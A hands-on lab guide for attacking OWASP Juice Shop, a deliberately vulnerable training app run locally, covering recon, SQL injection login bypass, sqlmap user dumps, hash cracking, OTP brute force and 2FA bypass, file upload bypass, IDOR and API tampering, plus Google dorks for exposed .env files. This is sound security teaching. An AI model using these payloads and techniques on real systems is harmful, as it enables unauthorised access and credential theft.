# 🧃 OWASP Juice Shop — Complete Lab Exercises

> **Platform:** OWASP Juice Shop (Node.js / Angular / SQLite)
> **Why Juice Shop?** Modern tech stack, 100+ built-in challenges, REST APIs, JWT auth, and real-world vulnerability patterns
> **Access:** `http://localhost:3000` (after Docker setup)

---

## 🛠️ Setup: Install & Run Juice Shop

```bash
# Step 1: Install Docker (if not already)
sudo apt install docker.io -y
sudo systemctl start docker

# Step 2: Pull and run Juice Shop
sudo docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

# Step 3: Verify it's running
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000
# ✅ EXPECTED: 200

# Step 4: Open in browser
# Go to: http://localhost:3000

# Useful Docker commands:
sudo docker stop juice-shop       # Stop
sudo docker start juice-shop      # Restart
sudo docker rm -f juice-shop      # Remove and re-create
```

> 💡 **Tip:** Juice Shop has a built-in Score Board at `http://localhost:3000/#/score-board` — enable it to track your progress on built-in challenges!

---

## 📑 Table of Contents

| # | Exercise | Key Skills |
|---|----------|-----------|
| 1 | [Encoding, Hashing & JWT](#-exercise-1-encoding-hashing--jwt) | Base64, Hex, MD5, SHA, JWT decoding |
| 2 | [Web Recon & Hidden Content](#-exercise-2-web-recon--hidden-content) | robots.txt, directory busting, source inspection |
| 3 | [Login Bypass & SQL Injection](#-exercise-3-login-bypass--sql-injection) | SQLi, default creds, admin access |
| 4 | [Server Fingerprinting](#-exercise-4-server-fingerprinting) | HTTP headers, Nmap, technology identification |
| 5 | [Form & Request Manipulation](#-exercise-5-form--request-manipulation) | Burp Suite, parameter tampering, cookie manipulation |
| 6 | [User Enumeration](#-exercise-6-user-enumeration) | Error-based enumeration, API user discovery |
| 7 | [2FA Bypass & Authentication Attacks](#-exercise-7-2fa-bypass--authentication-attacks) | TOTP, brute force, response manipulation |
| 8 | [REST API Exploitation](#-exercise-8-rest-api-exploitation) | HTTP methods, API abuse, method override |
| 9 | [Passive Reconnaissance](#-exercise-9-passive-reconnaissance) | WHOIS, DNS, Google dorking, OSINT |
| 10 | [Bonus: Juice Shop Specific Challenges](#-exercise-10-bonus-juice-shop-specific-challenges) | XSS, file upload, broken access control |

---
---

# 🔬 Exercise 1: Encoding, Hashing & JWT

> **Goal:** Identify encoding/hash types, decode them, and work with JWT tokens from Juice Shop
> **Time:** ~30-40 minutes

---

## 1A: Identify & Decode Encoded Strings

**Task:** Decode each string on Kali terminal.

### Base64
```bash
echo "Y3liZXJfc2VjdXJpdHlfcm9ja3M=" | base64 -d
# ✅ OUTPUT: cyber_security_rocks
```

### Hex
```bash
echo "70617373776f72643132333435" | xxd -r -p
# ✅ OUTPUT: password12345
```

### URL Encoding
```bash
python3 -c "import urllib.parse; print(urllib.parse.unquote('%2Fetc%2Fpasswd'))"
# ✅ OUTPUT: /etc/passwd
```

### ROT13
```bash
echo "frperg_cnffjbeq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# ✅ OUTPUT: secret_password
```

### Double Base64
```bash
echo "WVdSdGFXNDZjR0Z6YzNkdmNtUT0=" | base64 -d | base64 -d
# ✅ OUTPUT: admin:password
```

### Binary
```bash
python3 -c "print(''.join(chr(int(b, 2)) for b in '01110010 01101111 01101111 01110100'.split()))"
# ✅ OUTPUT: root
```

---

## 1B: Identify & Crack Hashes

```bash
# Hash 1 — MD5
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# ✅ EXPECTED: [+] MD5
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/hash1.txt
hashcat -m 0 /tmp/hash1.txt /usr/share/wordlists/rockyou.txt --force
# ✅ Cracked: password

# Hash 2 — SHA1
hashid 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d'
echo "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d" > /tmp/hash2.txt
hashcat -m 100 /tmp/hash2.txt /usr/share/wordlists/rockyou.txt --force
# ✅ Cracked: hello

# Hash 3 — SHA256
hashid '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'
echo "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" > /tmp/hash3.txt
hashcat -m 1400 /tmp/hash3.txt /usr/share/wordlists/rockyou.txt --force
# ✅ Cracked: admin
```

> **Note:** First time using rockyou.txt? → `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

---

## 1C: Create Your Own Hashes

```bash
echo -n "cybersecurity" | md5sum
echo -n "cybersecurity" | sha256sum
echo -n "interview2024" | sha1sum
openssl passwd -1 -salt testsalt mypassword123
# 📝 What does $1$ at the beginning mean? → MD5-based hash
```

---

## 1D: JWT Token Analysis (Juice Shop Specific! 🧃)

Juice Shop uses JWT tokens for authentication — this is a **real-world** skill.

```bash
# Step 1: Login to Juice Shop and capture the JWT
# Register & login at http://localhost:3000/#/login
# Open DevTools (F12) → Application → Local Storage → http://localhost:3000
# Copy the "token" value

# Step 2: Decode a sample JWT
JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiJ9LCJpYXQiOjE2MTYyMzkwMjJ9.signature"

# Decode header
echo "$JWT" | cut -d '.' -f 1 | base64 -d 2>/dev/null; echo
# ✅ Shows: {"alg":"RS256","typ":"JWT"}

# Decode payload
echo "$JWT" | cut -d '.' -f 2 | base64 -d 2>/dev/null; echo
# ✅ Shows: user data including email and role!
# 📝 What algorithm is used? _______________
# 📝 What user data is embedded? _______________
# 📝 Can you see the password hash? → YES! This is a vulnerability!
```

### Try JWT on jwt.io
```
1. Open https://jwt.io
2. Paste your actual Juice Shop JWT token
3. 📝 What does the payload reveal?
4. 📝 Is the signature verified? (Look for "Invalid Signature")
5. Try changing the role from "customer" to "admin" — 
   this is the basis of JWT manipulation attacks!
```

---

## 1E: Multi-Layer Decoding with CyberChef

```
1. Open https://gchq.github.io/CyberChef/
2. Input: NTI1NTY4NjU3MjczNjU2Mzc1NzI2OTc0Nzk=
3. Add "From Base64" → output looks like Hex
4. Add "From Hex" → Final: Rusecurity
5. Try CyberChef's "Magic" button for auto-detection!
```

---

## ✅ Exercise 1 Checklist

- [ ] Decoded all 6 encoding types (1A)
- [ ] Identified & cracked 3 hash types (1B)
- [ ] Created your own hashes (1C)
- [ ] Decoded Juice Shop JWT token — found embedded user data (1D)
- [ ] Used CyberChef for multi-layer decoding (1E)

---
---

# 🔬 Exercise 2: Web Recon & Hidden Content

> **Goal:** Discover hidden files, directories, and information on Juice Shop
> **Time:** ~25-35 minutes

---

## 2A: Check for Exposed Files

```bash
# Step 1: Check robots.txt
curl http://localhost:3000/robots.txt
# 📝 Does it exist? What's disallowed?

# Step 2: Check for common files
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/.git/config
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/ftp
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/.well-known/security.txt
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/security.txt
# 📝 Which returned 200? → Those files exist!

# Step 3: Check the /ftp directory (Juice Shop Easter Egg!)
curl http://localhost:3000/ftp/
# ✅ EXPECTED: Directory listing with interesting files!
# 📝 What files do you see? Download and inspect them.

# Step 4: Download files from /ftp
curl -O http://localhost:3000/ftp/acquisitions.md
curl -O http://localhost:3000/ftp/package.json.bak
curl -O http://localhost:3000/ftp/coupons_2013.md.bak
cat acquisitions.md
cat package.json.bak
# 📝 Any sensitive info in these files?
```

---

## 2B: Directory Discovery

```bash
# Step 1: Use gobuster on Juice Shop
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt
# 📝 What directories were discovered?

# Step 2: Try dirsearch (more comprehensive)
dirsearch -u http://localhost:3000 -e js,json,html,bak
# 📝 Any API endpoints or backup files found?

# Step 3: Check for Swagger/API documentation
curl http://localhost:3000/api-docs/ -s | head -30
curl http://localhost:3000/swagger.json -s | head -30
# 📝 Does the API documentation exist?
```

---

## 2C: Explore Page Source & JavaScript

```
1. Open http://localhost:3000 in Firefox
2. Right-click → View Page Source (Ctrl+U)
3. Look for:
   - HTML comments <!-- ... -->
   - JavaScript bundles (.js files)
   - Angular routes and paths
   - API endpoint references

4. Open DevTools (F12) → Sources/Debugger tab
   - Browse the main.js (Angular compiled code)
   - Search (Ctrl+F) for: "admin", "password", "secret", "api"
   - 📝 What hidden routes or endpoints do you find?

5. Try discovered paths:
   - http://localhost:3000/#/score-board
   - http://localhost:3000/#/administration
   - http://localhost:3000/metrics
   - http://localhost:3000/api/SecurityQuestions
   📝 Which ones are accessible?
```

---

## 2D: HTTP Headers for Clues

```bash
# Step 1: Analyze response headers
curl -I http://localhost:3000
# 📝 Server: _______________
# 📝 X-Powered-By: _______________
# 📝 X-Content-Type-Options: _______________

# Step 2: Check for security headers (or lack of them)
curl -s -I http://localhost:3000 | grep -iE "x-frame|x-xss|content-security|strict-transport|x-powered"
# 📝 Which security headers are MISSING? → That's a vulnerability!

# Step 3: Check backup file extensions
for ext in bak old orig save swp ~; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/index.$ext")
    echo "index.$ext → $code"
done
```

---

## 2E: Wayback Machine & Google Dorking

```bash
# For public web targets (NOT localhost Juice Shop):
# Wayback Machine: https://web.archive.org/web/*/example.com
# Google Dorking (in browser):
#   intitle:"juice shop" inurl:herokuapp
#   site:github.com "juice-shop" filetype:env
#   intitle:"Index of /" "parent directory"
```

### Google Dork Cheat Sheet
```
site:        → limit to domain          intitle:     → search page titles
filetype:    → specific file types      inurl:       → search in URLs
intext:      → search in body           ext:         → same as filetype
```

---

## ✅ Exercise 2 Checklist

- [ ] Checked robots.txt and common exposed files (2A)
- [ ] Discovered the /ftp directory and downloaded files (2A)
- [ ] Used gobuster/dirsearch for directory discovery (2B)
- [ ] Inspected page source and JS for hidden routes (2C)
- [ ] Analyzed HTTP response headers for info leakage (2D)
- [ ] Practiced Google dorking syntax (2E)

---
---

# 🔬 Exercise 3: Login Bypass & SQL Injection

> **Goal:** Bypass Juice Shop login using SQLi, exploit authentication flaws
> **Time:** ~40-50 minutes

---

## 3A: Register & Explore Normal Login

```
1. Register a test account:
   http://localhost:3000/#/register
   Email: test@test.com | Password: test1234! | Security Q: any → test

2. Login normally:
   http://localhost:3000/#/login
   ✅ EXPECTED: Successful login, JWT token stored in localStorage

3. Open DevTools (F12) → Application → Local Storage
   📝 Copy the JWT token — you'll need it later
```

---

## 3B: SQL Injection on Login Page

```
Step 1: Test for SQLi vulnerability
  - Go to http://localhost:3000/#/login
  - Email: ' (single quote)
  - Password: anything
  - Click Login
  📝 What error do you see? Does it reveal SQL info?

Step 2: Login as Admin via SQLi
  - Email: ' OR 1=1--
  - Password: anything
  - Click Login
  ✅ EXPECTED: Logged in as admin@juice-sh.op (first user in database)!
  📝 What user did you login as?

Step 3: Login as a specific user
  - Email: admin@juice-sh.op'--
  - Password: anything
  - Click Login
  ✅ EXPECTED: Logged in as admin (comment ignores password check)

Step 4: Try other SQLi payloads
  - Email: ' OR 1=1;--
  - Email: admin'--
  - Email: ' UNION SELECT * FROM Users--
  📝 Which payloads worked?
```

---

## 3C: SQLi with Burp Suite

```
Step 1: Configure Burp proxy (127.0.0.1:8080 in Firefox)

Step 2: Intercept a login request
  - Go to login page
  - Enter Email: test@test.com, Password: test
  - Click Login with Intercept ON

Step 3: Examine the intercepted POST request
  📝 What is the endpoint? (likely /rest/user/login)
  📝 What is the Content-Type? (application/json)
  📝 What does the request body look like?

Step 4: Modify the email field in Burp
  Change: "email":"test@test.com"
  To:     "email":"' OR 1=1--"
  Forward the request
  ✅ EXPECTED: Login successful as admin!

Step 5: Response manipulation
  - Login with wrong credentials
  - Intercept the response
  - Look for error indicators and try changing them
  📝 What does the error response look like?
```

---

## 3D: Crack Juice Shop Password Hashes

```bash
# Once you've found admin password hash from JWT or SQLi:
# Juice Shop uses MD5 hashes

# Admin hash (from JWT payload):
echo "0192023a7bbd73250516f069df18b500" > /tmp/juice_hash.txt
hashcat -m 0 /tmp/juice_hash.txt /usr/share/wordlists/rockyou.txt --force
# ✅ EXPECTED: admin123

# Or use John:
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/juice_hash.txt
john --format=raw-md5 --show /tmp/juice_hash.txt
```

---

## 3E: Automated SQLi with sqlmap

```bash
# Step 1: Capture a login request from Burp → Save to file
# Save the raw request as /tmp/juice_login.txt

# Step 2: Run sqlmap
sqlmap -r /tmp/juice_login.txt --level=3 --risk=2 --dbs-

# Alternative: Direct URL approach
sqlmap -u "http://localhost:3000/rest/products/search?q=test" --dbs
# 📝 What databases were found?
# 📝 What tables exist?

# Step 3: Dump users
sqlmap -u "http://localhost:3000/rest/products/search?q=test" --dump -T Users
# 📝 What user data was extracted?
```

---

## ✅ Exercise 3 Checklist

- [ ] Registered an account and explored normal login flow (3A)
- [ ] Performed SQLi login bypass — logged in as admin (3B)
- [ ] Used Burp Suite to intercept and modify login requests (3C)
- [ ] Cracked Juice Shop admin password hash (3D)
- [ ] Attempted automated SQLi with sqlmap (3E)

---
---

# 🔬 Exercise 4: Server Fingerprinting

> **Goal:** Identify Juice Shop's technology stack, headers, and configuration
> **Time:** ~25-30 minutes

---

## 4A: HTTP Header Analysis

```bash
# Step 1: Get response headers
curl -I http://localhost:3000
# 📝 Server: _______________
# 📝 X-Powered-By: _______________ (likely Express)
# 📝 X-Content-Type-Options: _______________

# Step 2: Verbose request
curl -v http://localhost:3000 2>&1 | head -30
# 📝 Any additional connection details?

# Step 3: Filter for technology headers
curl -s -I http://localhost:3000 | grep -iE "server|x-powered|x-content|set-cookie|x-frame"
# ✅ EXPECTED: X-Powered-By: Express → Node.js/Express backend!

# Step 4: Check API headers
curl -I http://localhost:3000/api/Products
# 📝 Different headers on API endpoint vs frontend?
```

---

## 4B: Web Technology Identification

```bash
# Step 1: whatweb scan
whatweb http://localhost:3000
# 📝 What technologies were identified?

# Step 2: Aggressive whatweb
whatweb -a 3 http://localhost:3000
# 📝 More details found?

# Step 3: Nikto scan
nikto -h http://localhost:3000
# 📝 Top 5 findings:
#   1. _______________
#   2. _______________
#   3. _______________
#   4. _______________
#   5. _______________

# Step 4: Wappalyzer (browser extension)
# Install Wappalyzer extension in Firefox
# Visit http://localhost:3000
# 📝 What does Wappalyzer detect? (Angular, Express, Node.js, etc.)
```

---

## 4C: Nmap Scan

```bash
# Step 1: Scan Juice Shop port
nmap -sV -sC -p 3000 localhost
# 📝 What service and version is detected?

# Step 2: NSE scripts
nmap --script=http-headers,http-methods,http-title -p 3000 localhost
# 📝 HTTP methods allowed: _______________
# 📝 Page title: _______________
```

---

## 4D: Error Page Analysis

```bash
# Step 1: Trigger a 404
curl http://localhost:3000/nonexistent_page_xyz
# 📝 Does the error page reveal technology info?

# Step 2: Trigger a server error
curl http://localhost:3000/api/Products/999999
# 📝 What error format is returned? (HTML? JSON?)

# Step 3: Try malformed requests
curl -X POST http://localhost:3000/api/Products -H "Content-Type: application/json" -d 'invalid json'
# 📝 Does the error message reveal stack trace or framework info?
```

---

## 4E: Compile Fingerprint Report

```
=== JUICE SHOP FINGERPRINT REPORT ===
Target: http://localhost:3000

Frontend Framework: _______________ (Angular)
Backend Framework:  _______________ (Express/Node.js)
Database:           _______________ (SQLite)
Language:           _______________ (JavaScript/TypeScript)

HTTP Headers:
  Server:           _______________
  X-Powered-By:     _______________

Missing Security Headers:
  - _______________
  - _______________

API Endpoints Found:
  - /api/Products
  - /api/Users
  - /rest/user/login
  - _______________
```

---

## ✅ Exercise 4 Checklist

- [ ] Analyzed HTTP headers — identified Express/Node.js (4A)
- [ ] Used whatweb, nikto, Wappalyzer for tech identification (4B)
- [ ] Performed Nmap service scan (4C)
- [ ] Analyzed error pages for info leakage (4D)
- [ ] Compiled a fingerprint report (4E)

---
---

# 🔬 Exercise 5: Form & Request Manipulation

> **Goal:** Intercept, modify, and tamper with Juice Shop requests using Burp Suite
> **Time:** ~35-45 minutes

---

## 5A: Intercept & Modify Product Requests

```
Step 1: Configure Burp proxy for Firefox

Step 2: Browse products (Intercept OFF)
  - Go to http://localhost:3000
  - Click on any product
  - Add it to basket
  📝 Watch the HTTP History in Burp — what requests are made?

Step 3: Intercept "Add to Basket" (Turn Intercept ON)
  - Add another product to basket
  - Examine the intercepted POST request
  📝 Endpoint: _______________
  📝 Request body (JSON): _______________
  📝 What parameters are sent? (ProductId, BasketId, quantity)

Step 4: Modify the request
  - Change the quantity to 0 or -1
  - Change the price if a price field exists
  - Forward the modified request
  📝 Did the server accept your modification?
```

---

## 5B: Price Manipulation (Basket Tampering)

```
Step 1: Add a product to your basket

Step 2: Go to basket page: http://localhost:3000/#/basket

Step 3: Intercept the basket update request
  - Change the quantity via the UI
  - Intercept in Burp
  - Try changing quantity to a negative number
  📝 Effect? _______________

Step 4: Try modifying the product price directly via API
  curl -X PUT http://localhost:3000/api/BasketItems/1 \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_JWT_TOKEN" \
    -d '{"quantity": 100}'
  📝 Can you change quantities via direct API call?
```

---

## 5C: Cookie & Token Manipulation

```bash
# Step 1: View your JWT token
# F12 → Application → Local Storage → token
# 📝 Copy the token value

# Step 2: Decode the JWT
echo "YOUR_JWT_TOKEN" | cut -d '.' -f 2 | base64 -d 2>/dev/null; echo
# 📝 What user data is in the payload?

# Step 3: Try using another user's email in API calls
curl http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer YOUR_JWT_TOKEN"
# 📝 What user info is returned?

# Step 4: Check cookie values in DevTools
# F12 → Application → Cookies
# 📝 What cookies are set? (language, cookieconsent, etc.)
# Try modifying the "language" cookie — does it change the UI?
```

---

## 5D: File Upload Manipulation

```
Step 1: Go to Complaint page
  http://localhost:3000/#/complain

Step 2: Upload a normal file
  - Create a test file: echo "test" > /tmp/test.txt
  - Upload via the form
  📝 What file types are accepted by the UI?

Step 3: Try uploading restricted files via Burp
  - Create: echo '<?php echo "test"; ?>' > /tmp/test.php
  - Intercept the upload and change Content-Type
  - Change filename extension in the request
  📝 Can you bypass the client-side file type filter?

Step 4: Try Null Byte bypass
  - Rename file to test.php%00.pdf in the request
  📝 Did the server accept it?
```

---

## 5E: CSRF & Request Replay

```
Step 1: Intercept a password change request
  - Go to http://localhost:3000/#/privacy-security/change-password
  - Change your password with Intercept ON
  📝 What parameters are sent?
  📝 Is there a CSRF token?

Step 2: Replay the request
  - Right-click → Send to Repeater
  - In Repeater, change the new password
  - Click Send
  📝 Can you replay the password change?
```

---

## ✅ Exercise 5 Checklist

- [ ] Intercepted and modified product/basket requests (5A)
- [ ] Attempted price manipulation (5B)
- [ ] Analyzed JWT tokens and cookies (5C)
- [ ] Attempted file upload bypass (5D)
- [ ] Tested CSRF/request replay (5E)

---
---

# 🔬 Exercise 6: User Enumeration

> **Goal:** Discover valid users through Juice Shop response differences
> **Time:** ~25-35 minutes

---

## 6A: Login Error Message Analysis

```
Step 1: Try a VALID email with WRONG password
  - http://localhost:3000/#/login
  - Email: admin@juice-sh.op
  - Password: wrongpassword
  📝 Error message: _______________

Step 2: Try an INVALID email
  - Email: nonexistent_user_xyz@fake.com
  - Password: anything
  📝 Error message: _______________

Step 3: Compare the two responses
  📝 Are the error messages identical?
  📝 Are response sizes different?
  📝 Is response time different?
  → If ANY differ, user enumeration is possible!
```

---

## 6B: Registration-Based Enumeration

```
Step 1: Try registering with an email that already exists
  - http://localhost:3000/#/register
  - Email: admin@juice-sh.op
  - Password: anything | Security Q: answer
  📝 Error message: _______________

Step 2: Try registering with a new email
  - Email: brand_new_user_xyz@test.com
  📝 Response: _______________

Step 3: Compare — does the app reveal which emails exist?
```

---

## 6C: API-Based User Enumeration

```bash
# Step 1: Check if user API is accessible
curl http://localhost:3000/api/Users -s | python3 -m json.tool | head -30
# 📝 Can you see user data without authentication?

# Step 2: Try with authentication
curl http://localhost:3000/api/Users \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" -s | python3 -m json.tool | head -30
# 📝 What user data is exposed?

# Step 3: Enumerate user IDs
for i in 1 2 3 4 5 6 7 8 9 10; do
    echo "=== User ID: $i ==="
    curl -s http://localhost:3000/api/Users/$i \
      -H "Authorization: Bearer YOUR_JWT_TOKEN" | python3 -m json.tool 2>/dev/null
done
# 📝 What users exist? List emails and roles.

# Step 4: Check security questions for user info
curl http://localhost:3000/api/SecurityQuestions -s | python3 -m json.tool
# 📝 What questions are available?

curl http://localhost:3000/api/SecurityAnswers -s | python3 -m json.tool
# 📝 Can you access security answers?
```

---

## 6D: Automated Enumeration with Burp Intruder

```
Step 1: Capture login POST in Burp → Send to Intruder

Step 2: Positions tab
  - Clear existing positions
  - Highlight the email value → Add §
  - Body looks like: {"email":"§test@test.com§","password":"test"}

Step 3: Payloads tab — Add emails to test:
  admin@juice-sh.op
  jim@juice-sh.op
  bender@juice-sh.op
  mc.safesearch@juice-sh.op
  ciso@juice-sh.op
  support@juice-sh.op
  nonexistent@fake.com
  random@random.com

Step 4: Start Attack → Sort by Response Length
  📝 Which emails gave different response sizes?
  → Those are valid registered users!
```

---

## 6E: Password Reset Enumeration

```
Step 1: Go to http://localhost:3000/#/forgot-password

Step 2: Enter a VALID email: admin@juice-sh.op
  📝 What happens? Is the security question shown?

Step 3: Enter an INVALID email: no_such_user@fake.com
  📝 What happens? Different behavior?

📝 Can you enumerate users through the forgot password feature?
```

---

## ✅ Exercise 6 Checklist

- [ ] Compared login error messages for valid vs invalid users (6A)
- [ ] Tested registration for email enumeration (6B)
- [ ] Enumerated users via API endpoints (6C)
- [ ] Used Burp Intruder for automated email enumeration (6D)
- [ ] Tested password reset for user enumeration (6E)

---
---

# 🔬 Exercise 7: 2FA Bypass & Authentication Attacks

> **Goal:** Explore 2FA setup on Juice Shop and practice bypass techniques
> **Time:** ~35-45 minutes

---

## 7A: Understand 2FA Concepts

```
2FA Flow:
1. User enters username + password → Step 1 authentication
2. Server generates OTP (TOTP via authenticator app)
3. User enters TOTP code → Step 2 authentication
4. If correct → access granted

Attack Surface:
├── Is the OTP short? (6 digits = 1,000,000 possibilities)
├── Is there rate limiting?
├── Does the OTP expire? (TOTP changes every 30 seconds)
├── Can you skip Step 2 entirely?
└── Can you manipulate the response?
```

---

## 7B: Set Up 2FA on Juice Shop

```
Step 1: Login as any user (or admin via SQLi)

Step 2: Navigate to 2FA settings
  - http://localhost:3000/profile
  - Check Privacy & Security section
  - Look for Two-Factor Authentication / 2FA / TOTP option

Step 3: Enable 2FA
  - Scan QR code with Google Authenticator / Authy
  - Or note the TOTP setup key (manual entry)
  - Enter the initial code to confirm

  📝 What type of 2FA does Juice Shop use? _______________
  📝 What is the TOTP setup key format? _______________
```

---

## 7C: Brute Force OTP with Burp Intruder

```
Step 1: Set up Burp proxy for Juice Shop

Step 2: Login with correct credentials → 2FA page appears

Step 3: Submit a wrong OTP → Capture in Burp → Send to Intruder

Step 4: Configure Intruder
  - Positions: Highlight the OTP value → Add §
  - Payloads:
    - Type: Numbers
    - From: 000000
    - To: 999999
    - Step: 1
    - Min/Max digits: 6

Step 5: Start Attack → Sort by response length
  📝 Is there rate limiting?
  📝 Did you find the correct OTP?

⚠️ Note: TOTP changes every 30 seconds — real brute force
   must be faster than the rotation window!
```

---

## 7D: 2FA Bypass Techniques

### Technique 1: Skip 2FA Page
```bash
# After Step 1 auth, try navigating directly to protected resources
curl http://localhost:3000/api/Products -H "Authorization: Bearer YOUR_JWT_TOKEN"
curl http://localhost:3000/rest/user/whoami -H "Authorization: Bearer YOUR_JWT_TOKEN"
# 📝 Can you access resources without completing 2FA?
```

### Technique 2: Response Manipulation
```
1. Submit wrong OTP → Intercept RESPONSE in Burp
2. Look for error indicators:
   - "success": false → change to true
   - HTTP 401 → change to 200
3. Forward modified response
📝 Did you bypass 2FA?
```

### Technique 3: Null/Empty OTP
```
In Burp, try submitting:
  - otp= (empty)
  - otp=null
  - otp=000000
  - Remove the OTP parameter entirely
📝 Does any of these bypass the check?
```

### Technique 4: Reuse Previous OTP
```
1. Complete 2FA with valid OTP → note the code
2. Log out → Log in again
3. Try the SAME OTP from step 1
📝 Does the old OTP still work?
```

---

## ✅ Exercise 7 Checklist

- [ ] Understood 2FA concepts and attack surfaces (7A)
- [ ] Set up 2FA on Juice Shop account (7B)
- [ ] Practiced OTP brute force with Burp Intruder (7C)
- [ ] Tried bypass techniques: skip, response manipulation, null OTP, reuse (7D)

---
---

# 🔬 Exercise 8: REST API Exploitation

> **Goal:** Discover and exploit Juice Shop's REST API endpoints
> **Time:** ~30-40 minutes

---

## 8A: API Discovery

```bash
# Step 1: Check for API documentation
curl http://localhost:3000/api-docs -s | head -20
curl http://localhost:3000/swagger.json -s | python3 -m json.tool | head -50

# Step 2: Test known API endpoints (no auth needed)
curl http://localhost:3000/api/Products -s | python3 -m json.tool | head -30
curl http://localhost:3000/api/Feedbacks -s | python3 -m json.tool | head -30
curl http://localhost:3000/api/Complaints -s | python3 -m json.tool | head -10
curl http://localhost:3000/api/SecurityQuestions -s | python3 -m json.tool
curl http://localhost:3000/rest/products/search?q= -s | python3 -m json.tool | head -30

# 📝 What data is accessible without authentication?
# 📝 What endpoints require authentication?
```

---

## 8B: Test HTTP Methods on Each Endpoint

```bash
# Check allowed methods
curl -X OPTIONS http://localhost:3000/api/Products -I
# 📝 Access-Control-Allow-Methods: _______________

# GET — read products
curl -X GET http://localhost:3000/api/Products -s | head -10
# ✅ EXPECTED: JSON product list

# POST — create a product?
curl -X POST http://localhost:3000/api/Products \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked Product","price":0.01,"description":"test"}' -s
# 📝 Can you create products without authentication?

# PUT — modify a product?
curl -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{"price":0.01}' -s
# 📝 Can you change product prices?

# DELETE — delete a product?
curl -X DELETE http://localhost:3000/api/Products/1 -s
# 📝 Can you delete products?
```

---

## 8C: Authenticated API Abuse

```bash
# Step 1: Login and get JWT token
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['authentication']['token'])")

# Step 2: Use token to access protected endpoints
curl http://localhost:3000/api/Users -H "Authorization: Bearer $TOKEN" -s | python3 -m json.tool | head -30
curl http://localhost:3000/api/Complaints -H "Authorization: Bearer $TOKEN" -s | python3 -m json.tool
curl http://localhost:3000/api/Recycles -H "Authorization: Bearer $TOKEN" -s | python3 -m json.tool

# Step 3: Try admin-only endpoints
curl http://localhost:3000/rest/admin/application-configuration -H "Authorization: Bearer $TOKEN" -s | python3 -m json.tool | head -30
# 📝 What admin config data is exposed?

# Step 4: Post a feedback as another user
curl -X POST http://localhost:3000/api/Feedbacks \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"comment":"Hacked feedback","rating":1,"UserId":2}' -s
# 📝 Can you post feedback as a different user? (IDOR vulnerability)
```

---

## 8D: Method Override Techniques

```bash
# Some servers honor method override headers
curl -X POST http://localhost:3000/api/Products/1 \
  -H "X-HTTP-Method-Override: DELETE" -s
curl -X POST http://localhost:3000/api/Products/1 \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"price":0.01}' -s

# Check CORS configuration
curl -X OPTIONS http://localhost:3000/api/Products -I
# 📝 Access-Control-Allow-Origin: _______________
# 📝 Access-Control-Allow-Methods: _______________
```

---

## 8E: Nmap HTTP Methods Detection

```bash
nmap --script=http-methods -p 3000 localhost
# 📝 What methods does nmap find?

nmap --script=http-headers -p 3000 localhost
# 📝 Any interesting headers?
```

---

## ✅ Exercise 8 Checklist

- [ ] Discovered API endpoints and documentation (8A)
- [ ] Tested GET, POST, PUT, DELETE on API endpoints (8B)
- [ ] Exploited API with admin JWT token — accessed user data (8C)
- [ ] Tried method override headers (8D)
- [ ] Used Nmap for HTTP methods detection (8E)

---
---

# 🔬 Exercise 9: Passive Reconnaissance

> **Goal:** Gather information about targets using only passive techniques (no direct traffic)
> **Time:** ~30-40 minutes
> ⚠️ Use safe public targets like example.com, scanme.nmap.org — NOT production sites

---

## 9A: WHOIS Lookup

```bash
whois example.com
# 📝 Registrar: _______________
# 📝 Created: _______________
# 📝 Name Servers: _______________

whois google.com
# 📝 What registrar does Google use?

# Online WHOIS: https://who.is/
```

---

## 9B: DNS Enumeration

```bash
nslookup example.com
dig example.com A       # IPv4
dig example.com MX      # Mail servers
dig example.com TXT     # SPF, DKIM
dig example.com NS      # Name servers
dig -x 93.184.216.34    # Reverse DNS

# 📝 Document all record types found
```

---

## 9C: Certificate Transparency

```bash
# Find subdomains via SSL certificate logs
curl -s "https://crt.sh/?q=example.com&output=json" | python3 -m json.tool | head -50

# Extract unique subdomains
curl -s "https://crt.sh/?q=example.com&output=json" | python3 -c "
import json, sys
data = json.load(sys.stdin)
domains = set(entry.get('common_name','') for entry in data)
for d in sorted(domains)[:20]: print(d)
"
```

---

## 9D: Subdomain Enumeration

```bash
# Install & use subfinder
sudo apt install subfinder -y
subfinder -d example.com

# Use amass (passive)
amass enum -passive -d example.com

# Online: https://dnsdumpster.com/
```

---

## 9E: Google Dorking Practice

```
site:example.com filetype:txt
site:github.com filetype:env
intitle:"login" inurl:admin
intitle:"Index of /" "parent directory"
